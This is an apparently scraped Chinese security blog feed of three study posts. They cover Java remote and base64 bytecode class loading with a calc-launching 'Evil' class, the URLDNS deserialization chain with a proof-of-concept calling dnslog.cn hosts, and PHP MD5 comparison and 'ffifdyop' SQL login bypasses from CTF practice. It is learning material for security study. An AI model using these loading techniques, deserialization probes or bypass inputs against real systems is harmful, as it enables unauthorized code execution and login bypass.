    <content type="html"><![CDATA[<h1 id="JAVA动态加载字节码"><a href="#JAVA动态加载字节码" class="headerlink" title="JAVA动态加载字节码"></a>JAVA动态加载字节码</h1><p>本文大多数忘了，因为当时学的时候就是简单了解。现在又是跟着网上的文章复习了一遍。</p><h2 id="Java字节码"><a href="#Java字节码" class="headerlink" title="Java字节码"></a>Java字节码</h2><p><code>Java字节码</code>指的是java虚拟机中的执行使用的一类指令，通常被存储在<code>.class</code>文件中。java之所以能够被盛行，无非就是在不同系统中不需要翻译成对应的0和1，而是间接的翻译成字节码。然后不用系统使用jvm虚拟机就可以运行。（当然这里也有一些条件。）</p><p><strong>ClassLoader处理字节码的流程：loadClass -&gt; findClass -&gt; defineClass</strong></p><h2 id="URLClassLoader远程加载"><a href="#URLClassLoader远程加载" class="headerlink" title="URLClassLoader远程加载"></a>URLClassLoader远程加载</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><ul><li>URL未以斜杠&#x2F;结尾，则认为是一个JAR文件，使用JarLoader来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠&#x2F;结尾，且协议名是file，则使用FildLoader来寻找类，即为在本地系统中寻找.class文件</li><li>URL以斜杠&#x2F;结尾，且协议名不是file，则使用最基础的Loader来寻找类</li></ul><h4 id="Evil恶意类"><a href="#Evil恶意类" class="headerlink" title="Evil恶意类"></a>Evil恶意类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Eivl</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Eivl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译一下。</p><h4 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoOne</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DemoOne</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:1234&quot;</span>);<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;url&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>);<br>        aClass.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里用到的<code>loadClass</code>作用：是从已加载的类缓存、父加载器等位置寻找类，在前面没有找到的情况下，执行 findClass。</strong></p><p><strong><code>findClass</code>作用：根据URL指定的方式来加载类的字节码，可能会在本地系统，jar包或远程http服务器上读取字节码，然后将其交给defineClass。</strong></p><p>在对应的<code>.class</code>文件下开启对应的服务。（phpstudy、python均可）。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015822.png" alt="QQ截图20220301192930"></p><p>运行远程加载，执行后就会弹出计算器。（这里尝试了加<code>\</code>或者不加都可以实现。）</p><h2 id="ClassLoader-defineClass直接加载"><a href="#ClassLoader-defineClass直接加载" class="headerlink" title="ClassLoader#defineClass直接加载"></a>ClassLoader#defineClass直接加载</h2><p><strong>这里所说的<code>denfineClass</code>作用：直接处理传入的字节码，将其处理成java类。</strong></p><p>这里就让我想起反射的时候<code>Class.forname</code>。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>)</span>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;类名&quot;</span>, 是否初始化类, 类加载器)</span>，而<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>loadClass默认不会初始化类方法。<br></code></pre></td></tr></table></figure><p>这里在跟一些大佬的博客的时候，发现许多都是用base64的方法去复现的。用到linux下的命令。（强烈推荐买个vps）。记得删除<code>\n</code>换行符。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012015420.png" alt="QQ截图20220301200451"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoTwo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> aClass.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAHwoABgASCgATABQIABUKABMAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTHhzdzZhL0Vpdmw7AQAKRXhjZXB0aW9ucwcAGQEAClNvdXJjZUZpbGUBAAlFaXZsLmphdmEMAAcACAcAGgwAGwAcAQAIY2FsYy5leGUMAB0AHgEACnhzdzZhL0VpdmwBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAEAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAGAAQABwANAAgACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAAAAAIAEQ==&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span>(Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;xsw6a.Eivl&quot;</span>, decode, <span class="hljs-number">0</span>, decode.length);<br>        evil.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是呢？这个<code>defineClass</code>作用域被<code>protect</code>限制了。无法在外部访问。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012018186.png" alt="QQ截图20220301201752"></p><p>很巧的是<strong>Templateslmp</strong>却调用了defineClass方法。<br>下面继续复习<strong>Templateslmp的利用</strong>。其实本次讲的都是铺垫。我也就没有跟进去调试。</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS链</title>
    <link href="/2022/03/01/URLDNS%E9%93%BE/"/>
    <url>/2022/03/01/URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>该链子常配合dnslog去验证是否存在反序列化（因为该链子不受jdk版本限制，且只依赖原生类。）</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap.readObject()<br>    HashMap.putVal()<br>        HashMap.hash()<br>            URL.hashCode()<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="HashMap为什么自己实现了writeObject（）和readObject（）"><a href="#HashMap为什么自己实现了writeObject（）和readObject（）" class="headerlink" title="HashMap为什么自己实现了writeObject（）和readObject（）"></a>HashMap为什么自己实现了writeObject（）和readObject（）</h3><p>首先明白一点。如果反序列化该类的时候，该类实现了writeObject（）和readObject（），就会执行该类的这两类方法。</p><p>跟着利用链来分析。</p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>代码非常长，这里只说关键的部分（<code>readObject（）</code>部分）。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002478.png" alt="QQ截图20220228232632"></p><p>跟进<code>hash（key）!</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002791.png" alt="QQ截图20220228232754"></p><p>这里return了<code>key.hashCode</code>，那么哪个类又调用了<code>hashCode</code>呢？</p><p>跟着利用链分析，这里的URL类使用了<code>hashcode</code></p><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002555.png" alt="QQ截图20220228233214"></p><p>跟进这里的<code>hashCode</code>。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002994.png" alt="QQ截图20220228233327"></p><p>这里就触发了访问dnslog。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDnsDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://xen3dy.dnslog.cn&quot;</span>);<br>        url.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的这个代码会不会触发dnslog呢？答案是会。跟进去看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002986.png" alt="QQ截图20220228234601"></p><p>同样会往下走,接着触发<code>getHsotAddress()</code>。那如果是这样在序列化的时候就可以触发dnslog了，根本在实战中也起不到验证的作用。<br>那么接下来我们就要去修改这个<code>hashCode</code>的值。怎样修改呢？先来看看<code>hashCode</code>是什么属性吧？<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203010002790.png" alt="QQ截图20220228235155"></p><p>就反射修改该属性。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrlDns</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://u5gnvq.dnslog.cn&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">haseCode</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        haseCode.setAccessible(<span class="hljs-literal">true</span>);<br>        haseCode.set(url, <span class="hljs-number">2213</span>);<br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br><br>        haseCode.set(url, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(hashMap);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于MD5</title>
    <link href="/2022/02/28/%E5%85%B3%E4%BA%8EMD5/"/>
    <url>/2022/02/28/%E5%85%B3%E4%BA%8EMD5/</url>
    
    <content type="html"><![CDATA[<h1 id="关于MD5"><a href="#关于MD5" class="headerlink" title="关于MD5"></a>关于MD5</h1><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131963.png"></p><h2 id="′-x3D-x3D-′"><a href="#′-x3D-x3D-′" class="headerlink" title="′&#x3D;&#x3D;′"></a>′&#x3D;&#x3D;′</h2><p>会先将字符串换成相同类型，再作比较，属于弱类型比较。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;1aaa500&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>==<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131909.png"></p><h2 id="′-x3D-x3D-x3D-′"><a href="#′-x3D-x3D-x3D-′" class="headerlink" title="′&#x3D;&#x3D;&#x3D;′"></a>′&#x3D;&#x3D;&#x3D;′</h2><p>会同时比较字符串的值和类型。（不一一验证）。</p><h2 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a_a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=QNKCDZO&amp;b=aabg7XSs<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131242.png" alt="QQ截图20220227222344"></p><p>这里的两个a，b。在MD5加密后变成均为0e开头的字符串，而又通过弱类型比较变为0&#x3D;0。</p><h2 id="md5强比较"><a href="#md5强比较" class="headerlink" title="md5强比较"></a>md5强比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131276.png" alt="QQ截图20220227222810"></p><p><strong>md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到&#x3D;&#x3D;&#x3D;强比较的值相等</strong></p><h2 id="特定条件下的MD验证绕过"><a href="#特定条件下的MD验证绕过" class="headerlink" title="特定条件下的MD验证绕过"></a>特定条件下的MD验证绕过</h2><p>之前就是有一道题刷到过。也是在buuctf上。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ’admin’ <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span>md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>MD5报文将以原始 16字符二进制格式返回</p><p><strong>ffifdyop 字符串经过MD5加密后为276f722736c95d99e921722cf9ed621c</strong><br><strong>在转换成字符串为’or’6乱码</strong></p><p>Select * from ’admin’ where password&#x3D;‘or’6乱码<br><strong>相当于万能密码</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202282131783.png" alt="QQ截图20220227223725"></p><h2 id="md5强比较（限制字符串）"><a href="#md5强比较（限制字符串）" class="headerlink" title="md5强比较（限制字符串）"></a>md5强比较（限制字符串）</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]!==(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Xsw6a&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>需要使用使用md5加密后两个完全相等的两个字符串来绕过过滤。</strong><br>这里就不详细说了。（我没怎么看，我感觉只要知道就行了）</p><p>这里我是真没复现出来。我是真的会谢！！！复现了一晚上加一下午+现在是20.52分。我真的会谢。<br>终于复现出来了。真的会谢。<br><a 